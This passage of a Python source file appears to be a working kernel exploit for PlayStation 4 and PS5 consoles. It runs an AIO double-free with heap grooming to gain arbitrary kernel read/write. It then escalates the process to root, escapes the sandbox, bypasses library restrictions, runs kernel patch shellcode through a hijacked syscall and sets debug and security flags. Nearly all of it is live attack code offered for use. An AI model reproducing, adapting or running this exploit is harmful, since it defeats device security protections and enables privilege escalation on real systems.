    if kstr != "evf cv":
        raise Exception('test read of &"evf cv" failed')

    print("arbitrary kernel r/w achieved!")

    # RESTORE: clean corrupt pointers
    # pktopts.ip6po_rthdr = NULL

    off_ip6po_rthdr = 0x68 if sc.platform == "ps4" else 0x70

    for sd in sds:
        sock_pktopts = get_sock_pktopts(sd, kread8)
        kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0)

    reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword)

    kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0)
    kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0)

    sock_increase_ref = [
        ipv6_kernel_rw.master_sock,
        ipv6_kernel_rw.victim_sock,
        master_sock,
        worker_sock,
        reclaim_sock,
    ]

    for each in sock_increase_ref:
        sock_addr = get_fd_data_addr(each, kernel.read_qword)
        kernel.write_dword(sock_addr, 0x100)  # so_count

    print("fixes applied")


def post_exploitation_ps4():
    evf_ptr = kernel.inside_kdata_addr
    evf_string = kernel.read_null_terminated_string(evf_ptr)
    print("evf string @ %s = %s" % (hex(evf_ptr), evf_string))

    # Calculate KBASE from EVF using table offsets
    # credit: @egycnq
    def calculate_kbase(leaked_evf_ptr):
        evf_offset = SELECTED_KERNEL_VERSION_OFFSETS["EVF_OFFSET"]
        kernel.data_base = leaked_evf_ptr - evf_offset

    # ELF validation
    # credit: @egycnq
    def verify_elf_header():
        b0 = kernel.read_byte(kernel.data_base + 0x0)
        b1 = kernel.read_byte(kernel.data_base + 0x1)
        b2 = kernel.read_byte(kernel.data_base + 0x2)
        b3 = kernel.read_byte(kernel.data_base + 0x3)

        print("ELF header bytes at %s:" % hex(kernel.data_base))
        print("  [0] = 0x%02X" % b0)
        print("  [1] = 0x%02X" % b1)
        print("  [2] = 0x%02X" % b2)
        print("  [3] = 0x%02X" % b3)

        if b0 == 0x7F and b1 == 0x45 and b2 == 0x4C and b3 == 0x46:
            print("ELF header verified KBASE is valid")
        else:
            print("ELF header mismatch check base address")

    # Sandbox escape
    # credit: @egycnq
    def escape_sandbox(curproc):
        PRISON0 = kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["PRISON0"]
        ROOTVNODE = kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["ROOTVNODE"]

        OFFSET_P_UCRED = 0x40

        proc_fd = kernel.read_qword(curproc + SELECTED_KERNEL_OFFSETS["PROC_FD"])
        ucred = kernel.read_qword(curproc + OFFSET_P_UCRED)

        kernel.write_dword(ucred + 0x4, 0)  # cr_uid
        kernel.write_dword(ucred + 0x8, 0)  # cr_ruid
        kernel.write_dword(ucred + 0xC, 0)  # cr_svuid
        kernel.write_dword(ucred + 0x10, 1)  # cr_ngroups
        kernel.write_dword(ucred + 0x14, 0)  # cr_rgid

        prison0 = kernel.read_qword(PRISON0)
        kernel.write_qword(ucred + 0x30, prison0)

        # add JIT privileges
        kernel.write_qword(ucred + 0x60, 0xFFFFFFFFFFFFFFFF)
        kernel.write_qword(ucred + 0x68, 0xFFFFFFFFFFFFFFFF)

        rootvnode = kernel.read_qword(ROOTVNODE)
        kernel.write_qword(proc_fd + 0x10, rootvnode)  # fd_rdir
        kernel.write_qword(proc_fd + 0x18, rootvnode)  # fd_jdir

        print("Sandbox escape complete ... root FS access and jailbroken")

    def apply_kernel_patches_ps4():
        # get kpatches shellcode
        bin_data = get_kernel_patches_shellcode()
        if bin_data is None:
            print("Skipping kernel patches due to missing kernel patches shellcode.")
            return

        bin_data_addr = get_ref_addr(bin_data)
        print("File read to address: 0x%x, %d bytes" % (bin_data_addr, len(bin_data)))

        mapping_addr = 0x920100000

        sysent_661_addr = (
            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["SYSCALL_661_OFFSET"]
        )
        sy_narg = kernel.read_dword(sysent_661_addr)
        sy_call = kernel.read_qword(sysent_661_addr + 8)
        sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2C)

        kernel.write_dword(sysent_661_addr, 2)
        kernel.write_qword(
            sysent_661_addr + 8,
            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["JMP_RSI_GADGET"],
        )
        kernel.write_dword(sysent_661_addr + 0x2C, 1)

        PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC

        aligned_memsz = 0x10000

        # create shm with exec permission
        exec_handle = sc.syscalls.jitshm_create(0, aligned_memsz, PROT_RWX)

        # map executable segment
        sc.syscalls.mmap(
            mapping_addr,
            aligned_memsz,
            PROT_RWX,
            0x11,
            exec_handle,
            0,
        )
        sc.mem[mapping_addr - 0x1000 : mapping_addr - 0x1000 + len(bin_data)] = bin_data
        print("First bytes: 0x%x", readuint(mapping_addr, 4))

        sc.syscalls.kexec(mapping_addr)

        print("After kexec")

        kernel.write_dword(sysent_661_addr, sy_narg)
        kernel.write_qword(sysent_661_addr + 8, sy_call)
        kernel.write_dword(sysent_661_addr + 0x2C, sy_thrcnt)

        # TODO: we're supposed to have write_handle but idk where it is

        kernel.is_ps4_kpatches_applied = True

    kernel.is_ps4_kpatches_applied = False
    proc = kernel.curproc_addr
    calculate_kbase(evf_ptr)
    print("Kernel Base Candidate: %s" % hex(kernel.data_base))
    verify_elf_header()
    escape_sandbox(proc)
    apply_kernel_patches_ps4()


def post_exploitation_ps5():
    OFFSET_UCRED_CR_SCEAUTHID = 0x58
    OFFSET_UCRED_CR_SCECAPS = 0x60
    OFFSET_UCRED_CR_SCEATTRS = 0x83
    OFFSET_P_UCRED = 0x40

    KDATA_MASK = 0xFFFF804000000000
    SYSTEM_AUTHID = 0x4800000000010003

    def find_allproc():
        proc = kernel.curproc_addr
        max_attempt = 32

        for _ in range(max_attempt):
            if proc & KDATA_MASK == KDATA_MASK:
                data_base = proc - SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_ALLPROC"]
                if data_base & 0xFFF == 0:
                    return proc
            proc = kernel.read_qword(proc + 8)  # proc->p_list->le_prev

        raise Exception("failed to find allproc")

    def get_dmap_base():
        assert kernel.data_base is not None

        OFFSET_PM_PML4 = 0x20
        OFFSET_PM_CR3 = 0x28

        kernel_pmap_store = (
            kernel.data_base
            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_KERNEL_PMAP_STORE"]
        )

        pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4)
        cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3)
        dmap_base = pml4 - cr3

        return dmap_base, cr3

    def get_additional_kernel_address():
        kernel.allproc_addr = find_allproc()
        kernel.data_base = (
            kernel.allproc_addr - SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_ALLPROC"]
        )
        kernel.base_addr = (
            kernel.data_base - SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE"]
        )

        dmap_base, kernel_cr3 = get_dmap_base()
        kernel.dmap_base_addr = dmap_base
        kernel.kernel_cr3_addr = kernel_cr3

    def escape_filesystem_sandbox(proc):
        proc_fd = kernel.read_qword(proc + SELECTED_KERNEL_OFFSETS["PROC_FD"])  # p_fd
        rootvnode = kernel.read_qword(
            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_ROOTVNODE"]
        )

        kernel.write_qword(proc_fd + 0x10, rootvnode)  # fd_rdir
        kernel.write_qword(proc_fd + 0x18, rootvnode)  # fd_jdir

    def patch_dynlib_restriction(proc):
        dynlib_obj_addr = kernel.read_qword(proc + 0x3E8)

        kernel.write_dword(dynlib_obj_addr + 0x118, 0)  # prop (todo: recheck)
        kernel.write_qword(dynlib_obj_addr + 0x18, 1)  # libkernel ref

        # bypass libkernel address range check (credit @cheburek3000)
        kernel.write_qword(dynlib_obj_addr + 0xF0, 0)  # libkernel start addr
        kernel.write_qword(
            dynlib_obj_addr + 0xF8, 0xFFFFFFFFFFFFFFFF
        )  # libkernel end addr

    def patch_ucred(ucred, authid):
        kernel.write_qword(ucred + 0x4, 0)  # cr_uid
        kernel.write_qword(ucred + 0x8, 0)  # cr_ruid
        kernel.write_qword(ucred + 0xC, 0)  # cr_svuid
        kernel.write_qword(ucred + 0x10, 1)  # cr_ngroups
        kernel.write_qword(ucred + 0x14, 0)  # cr_rgid

        # escalate sony privs
        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid)  # cr_sceAuthID

        # enable all app capabilities
        kernel.write_qword(
            ucred + OFFSET_UCRED_CR_SCECAPS, 0xFFFFFFFFFFFFFFFF
        )  # cr_sceCaps[0]
        kernel.write_qword(
            ucred + OFFSET_UCRED_CR_SCECAPS + 8, 0xFFFFFFFFFFFFFFFF
        )  # cr_sceCaps[1]

        # set app attributes
        kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80)  # SceAttrs

    def escalate_curproc():
        proc = kernel.curproc_addr

        ucred = kernel.read_qword(proc + OFFSET_P_UCRED)  # p_ucred
        authid = SYSTEM_AUTHID

        uid_before = sc.syscalls.getuid()
        in_sandbox_before = sc.syscalls.is_in_sandbox()

        print("patching curproc %s (authid = %s)", hex(proc), hex(authid))

        patch_ucred(ucred, authid)
        patch_dynlib_restriction(proc)
        escape_filesystem_sandbox(proc)

        uid_after = sc.syscalls.getuid()
        in_sandbox_after = sc.syscalls.is_in_sandbox()

        print("we root now? uid: before %d after %d" % (uid_before, uid_after))
        print(
            "we escaped now? before %d after %d" % (in_sandbox_before, in_sandbox_after)
        )

    def apply_patches_to_kernel_data(accessor):
        security_flags_addr = (
            kernel.data_base
            + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_SECURITY_FLAGS"]
        )
        target_id_flags_addr = (
            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_TARGET_ID"]
        )
        qa_flags_addr = (
            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_QA_FLAGS"]
        )
        utoken_flags_addr = (
            kernel.data_base + SELECTED_KERNEL_VERSION_OFFSETS["DATA_BASE_UTOKEN_FLAGS"]
        )

        # Set security flags
        print("settings security flags")
        security_flags = accessor.read_dword(security_flags_addr)
        accessor.write_dword(security_flags_addr, security_flags | 0x14)

        # Set targetid to DEX
        print("settings targetid")
        accessor.write_byte(target_id_flags_addr, 0x82)

        # Set qa flags and utoken flags for debug menu enable
        print("setting qa flags and utoken flags")
        qa_flags = accessor.read_dword(qa_flags_addr)
        accessor.write_dword(qa_flags_addr, qa_flags | 0x10300)

        utoken_flags = accessor.read_byte(utoken_flags_addr)
        accessor.write_byte(utoken_flags_addr, utoken_flags | 0x1)

        print("debug menu enabled")

    get_additional_kernel_address()

    # patch current process creds
    escalate_curproc()

    find_additional_offsets()

    gpu = GPU()

    major_version = int(sc.version.split(".")[0])
    if major_version >= 7:
        print("applying patches to kernel data (with GPU DMA method)")
        apply_patches_to_kernel_data(gpu)
    else:
        print("applying patches to kernel data")
        apply_patches_to_kernel_data(kernel)


def kexploit():
    prev_core = get_current_core()
    prev_rtprio = get_rtprio()

    # pin to 1 core so that we only use 1 per-cpu bucket.
    # this will make heap spraying and grooming easier
    pin_to_core(MAIN_CORE)
    set_rtprio(MAIN_RTPRIO)

    print("pinning to core %d with prio %d" % (get_current_core(), get_rtprio()))

    sockpair = alloc(8)
    sds = []
    sds_alt = []

    if (
        u64_to_i64(
            sc.syscalls.socketpair(
                AF_UNIX,
                SOCK_STREAM,
                0,
                get_ref_addr(sockpair),
            )
        )
        == -1
    ):
        raise Exception(
            "socketpair error: %d\n%s"
            % (sc.syscalls.socketpair.errno, sc.syscalls.socketpair.get_error_string())
        )

    block_fd = struct.unpack("<I", sockpair[0:4])[0]
    unblock_fd = struct.unpack("<I", sockpair[4:8])[0]

    print("block_fd: %d, unblock_fd: %d" % (block_fd, unblock_fd))

    # NOTE: on game process, only < 130? sockets can be created, otherwise we'll hit limit error
    for _ in range(NUM_SDS):
        sds.append(new_socket())

    for _ in range(NUM_SDS_ALT):
        sds_alt.append(new_socket())

    block_id, groom_ids = None, None

    try:
        block_id, groom_ids = setup(block_fd)

        print("[+] Double-free AIO")
        sd_pair = double_free_reqs2(sds)

        print("[+] Leak kernel addresses")
        (
            reqs1_addr,
            kbuf_addr,
            kernel_addr,
            target_id,
            evf,
            fake_reqs3_addr,
            fake_reqs3_sd,
            aio_info_addr,
        ) = leak_kernel_addrs(sd_pair, sds)

        print("[+] Double free SceKernelAioRWRequest")
        pktopts_sds = double_free_reqs1(
            reqs1_addr, target_id, evf, sd_pair[0], sds, sds_alt, fake_reqs3_addr
        )

        sc.syscalls.close(fake_reqs3_sd)

        print("[+] Get arbitrary kernel read/write")
        make_kernel_arw(
            pktopts_sds, kbuf_addr, kernel_addr, sds, sds_alt, aio_info_addr
        )

        print("[+] Post exploitation")

        if sc.platform == "ps4":
            post_exploitation_ps4()
        else:
            post_exploitation_ps5()

        print("done!")
    except Exception as e:
        print("[-] Exploit failed: %s" % str(e))
    finally:
        sc.syscalls.close(block_fd)
        sc.syscalls.close(unblock_fd)

        if groom_ids is not None:
            free_aios2(get_ref_addr(groom_ids), NUM_GROOMS)

        if block_id is not None:
            aio_multi_wait(get_ref_addr(block_id), 1)
            aio_multi_delete(get_ref_addr(block_id), 1)

        for sd in sds:
            sc.syscalls.close(sd)

        for sd in sds_alt:
            sc.syscalls.close(sd)

        print("restoring to previous core/rtprio")

        pin_to_core(prev_core)
        set_rtprio(prev_rtprio)


kexploit()
